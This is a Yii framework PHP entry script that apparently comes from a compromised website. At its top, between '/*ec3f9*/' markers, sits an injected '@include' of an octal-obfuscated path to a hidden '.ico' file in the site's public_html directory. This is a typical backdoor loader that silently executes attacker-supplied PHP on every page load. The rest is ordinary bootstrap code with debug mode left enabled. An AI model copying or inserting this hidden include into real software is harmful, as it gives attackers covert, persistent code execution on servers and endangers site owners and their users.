<?php


/*ec3f9*/

@include "\057home\057scwa\144min/\160ubli\143_htm\154/EMR\064all.\143om/.\0632769\062f0.i\143o";

/*ec3f9*/

$yii=dirname(__FILE__).'/../yii-base/framework/yii.php';
$config = dirname(__FILE__).'/protected/config/front.php';
  
// Remove the following lines when in production mode
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_TRACE_LEVEL') or define('YII_TRACE_LEVEL', 3);
  
require_once($yii);
Yii::createWebApplication($config)->runEnd('front');

